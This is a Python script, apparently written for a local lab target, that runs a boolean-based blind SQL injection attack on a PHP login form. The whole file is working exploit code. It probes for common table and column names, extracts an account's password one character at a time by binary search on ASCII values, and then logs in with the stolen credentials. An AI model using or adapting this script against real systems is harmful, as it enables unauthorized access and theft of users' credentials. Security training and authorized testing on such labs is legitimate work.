import requests
import string
import time

# Configuration
URL = "http://127.0.0.1:33210/index.php"
SESSION_COOKIE = {"PHPSESSID": "pr8716h5ra06p5lchf9osb22qr"}

# Common tables to test
TABLES = ["users", "user", "admin", "admins", "administrators", "accounts", "login"]
# Common columns
USERNAME_COLUMNS = ["username", "user", "name", "email", "login"]
PASSWORD_COLUMNS = ["password", "pass", "pwd", "hash", "passwd"]
# Common usernames to test
USERNAMES = ["admin", "administrator", "root", "test", "user", "demo", "system"]

def send_payload(username_payload):
    """Send SQL injection payload and return True if response contains 'password'"""
    data = {
        "username": username_payload,
        "password": "test",
        "submit": "Login"
    }
    try:
        response = requests.post(URL, data=data, cookies=SESSION_COOKIE, timeout=10)
        return "password" in response.text.lower()
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False

def test_vulnerability():
    """Test if the SQL injection vulnerability exists"""
    print("[TEST 1] Testing basic SQL injection...")
    
    # Test TRUE condition
    payload_true = "admin' AND 1=1-- "
    result_true = send_payload(payload_true)
    print(f"  Payload: {payload_true}")
    print(f"  Result: {'TRUE (password in response)' if result_true else 'FALSE (username in response)'}")
    
    # Test FALSE condition
    payload_false = "admin' AND 1=2-- "
    result_false = send_payload(payload_false)
    print(f"  Payload: {payload_false}")
    print(f"  Result: {'TRUE (password in response)' if result_false else 'FALSE (username in response)'}")
    
    if result_true and not result_false:
        print("[✓] Vulnerability confirmed - Boolean-based blind SQL injection works!")
        return True
    else:
        print("[✗] Vulnerability not working as expected")
        return False

def find_table():
    """Find which table exists in the database"""
    print("\n[TEST 2] Enumerating tables...")
    
    for table in TABLES:
        # Test for MySQL/MariaDB
        payload = f"admin' AND (SELECT COUNT(*) FROM {table})>=0-- "
        if send_payload(payload):
            print(f"  [+] Table '{table}' exists!")
            return table
        
        # Alternative payload (check if table has rows)
        payload = f"admin' AND (SELECT COUNT(*) FROM {table})>0-- "
        if send_payload(payload):
            print(f"  [+] Table '{table}' exists and has data!")
            return table
    
    print("  [-] No common table found")
    return None

def find_username_column(table):
    """Find which column stores usernames"""
    print(f"\n[TEST 3] Finding username column in '{table}'...")
    
    for col in USERNAME_COLUMNS:
        # Check if column exists by testing a simple query
        payload = f"admin' AND (SELECT COUNT({col}) FROM {table})>=0-- "
        if send_payload(payload):
            print(f"  [+] Column '{col}' exists!")
            return col
    
    print("  [-] No common username column found")
    return None

def find_password_column(table):
    """Find which column stores passwords"""
    print(f"\n[TEST 4] Finding password column in '{table}'...")
    
    for col in PASSWORD_COLUMNS:
        # Check if column exists
        payload = f"admin' AND (SELECT COUNT({col}) FROM {table})>=0-- "
        if send_payload(payload):
            print(f"  [+] Column '{col}' exists!")
            return col
    
    print("  [-] No common password column found")
    return None

def find_specific_username(table, username_col):
    """Find a specific username in the table"""
    print(f"\n[TEST 5] Finding specific usernames in '{table}.{username_col}'...")
    
    for username in USERNAMES:
        # Check if this username exists
        payload = f"admin' AND (SELECT COUNT(*) FROM {table} WHERE {username_col}='{username}')>0-- "
        if send_payload(payload):
            print(f"  [+] Username '{username}' exists!")
            return username
    
    print("  [-] No common username found")
    return None

def extract_string_length(table, username_col, username, password_col):
    """Extract the length of the password string"""
    print(f"\n[TEST 6] Extracting password length for '{username}'...")
    
    for length in range(1, 101):  # Assume max length 100
        payload = f"admin' AND LENGTH((SELECT {password_col} FROM {table} WHERE {username_col}='{username}' LIMIT 1))={length}-- "
        if send_payload(payload):
            print(f"  [+] Password length: {length}")
            return length
    
    print("  [-] Could not determine password length")
    return None

def extract_password(table, username_col, username, password_col, password_length):
    """Extract password character by character using ASCII comparison"""
    print(f"\n[TEST 7] Extracting {password_length} character password for '{username}'...")
    
    password = ""
    chars_needed = password_length - len(password)
    
    for pos in range(1, password_length + 1):
        # Binary search for character value (ASCII 32-126 printable chars)
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if character at position is greater than mid
            payload_gt = f"admin' AND ASCII(SUBSTRING((SELECT {password_col} FROM {table} WHERE {username_col}='{username}' LIMIT 1),{pos},1))>{mid}-- "
            result_gt = send_payload(payload_gt)
            
            if result_gt:
                # Character is greater than mid
                low = mid + 1
            else:
                # Character is less than or equal to mid
                # Test if equal
                payload_eq = f"admin' AND ASCII(SUBSTRING((SELECT {password_col} FROM {table} WHERE {username_col}='{username}' LIMIT 1),{pos},1))={mid}-- "
                result_eq = send_payload(payload_eq)
                
                if result_eq:
                    char = chr(mid)
                    password += char
                    print(f"  Position {pos}: '{char}' (ASCII {mid})")
                    break
                else:
                    # Character is less than mid
                    high = mid - 1
        
        # Print progress
        print(f"  Progress: {password}{'*' * (password_length - len(password))}")
    
    return password

def verify_credentials(username, password):
    """Verify extracted credentials work"""
    print(f"\n[TEST 8] Verifying credentials: '{username}' / '{password}'...")
    
    data = {
        "username": username,
        "password": password,
        "submit": "Login"
    }
    
    try:
        response = requests.post(URL, data=data, cookies=SESSION_COOKIE, timeout=10)
        if "password" in response.text.lower() or "welcome" in response.text.lower():
            print(f"  [✓] Credentials verified successfully!")
            return True
        else:
            print(f"  [-] Credentials verification failed")
            print(f"  Response preview: {response.text[:200]}")
            return False
    except Exception as e:
        print(f"  [ERROR] Verification failed: {e}")
        return False

def main():
    """Main exploitation routine"""
    print("=" * 60)
    print("Boolean-based Blind SQL Injection Exploit")
    print("Target: http://127.0.0.1:33210/index.php")
    print("=" * 60)
    
    # Step 1: Test vulnerability
    if not test_vulnerability():
        print("\n[!] Aborting - vulnerability not confirmed")
        return
    
    time.sleep(0.5)
    
    # Step 2: Find table
    table = find_table()
    if not table:
        print("\n[!] Could not identify table - trying default 'users'")
        table = "users"
    
    time.sleep(0.5)
    
    # Step 3: Find username column
    username_col = find_username_column(table)
    if not username_col:
        print(f"\n[!] Could not identify username column - trying default 'username'")
        username_col = "username"
    
    time.sleep(0.5)
    
    # Step 4: Find password column
    password_col = find_password_column(table)
    if not password_col:
        print(f"\n[!] Could not identify password column - trying default 'password'")
        password_col = "password"
    
    time.sleep(0.5)
    
    # Step 5: Find a specific username
    target_username = find_specific_username(table, username_col)
    if not target_username:
        print(f"\n[!] Could not find username - trying default 'admin'")
        target_username = "admin"
    
    time.sleep(0.5)
    
    # Step 6: Extract password length
    password_length = extract_string_length(table, username_col, target_username, password_col)
    if not password_length:
        print(f"\n[!] Could not extract password length - trying default length 32")
        password_length = 32
    
    time.sleep(0.5)
    
    # Step 7: Extract password
    print(f"\n[+] Starting extraction of password...")
    password = extract_password(table, username_col, target_username, password_col, password_length)
    
    if password:
        print("\n" + "=" * 60)
        print("[SUCCESS] Credentials Extracted!")
        print(f"Username: {target_username}")
        print(f"Password: {password}")
        print("=" * 60)
        
        # Step 8: Verify credentials
        verify_credentials(target_username, password)
        
        # Show SQL query structure used
        print(f"\n[SQL Query Structure]")
        print(f"Username: {table}.{username_col}")
        print(f"Password: {table}.{password_col}")
    else:
        print("\n[!] Failed to extract password")

if __name__ == "__main__":
    main()

